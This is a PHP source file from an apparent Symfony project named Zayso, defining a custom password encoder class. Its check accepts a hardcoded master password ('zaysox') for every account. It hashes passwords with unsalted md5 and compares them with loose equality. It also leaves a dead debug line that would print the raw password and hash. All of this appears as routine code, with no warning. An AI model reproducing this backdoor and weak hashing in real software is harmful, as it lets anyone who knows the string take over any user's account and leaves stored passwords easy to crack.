<?php

namespace Zayso\ZaysoBundle\Component\Security\User;

use Symfony\Component\Security\Core\Encoder\PasswordEncoderInterface;

class MyEncoder implements PasswordEncoderInterface
{
    function encodePassword($raw, $salt)
    {
        return md5($raw);
    }
    function isPasswordValid($encoded, $raw, $salt)
    {
        // Master Password
        if ($raw == 'zaysox') return true;

        // The usual
        $pass = $this->encodePassword($raw,$salt);
        if ($pass == $encoded) return true;

        return false;
        
        die('isPasswordValid ' . $raw . ' ' . $encoded);
    }
}

?>
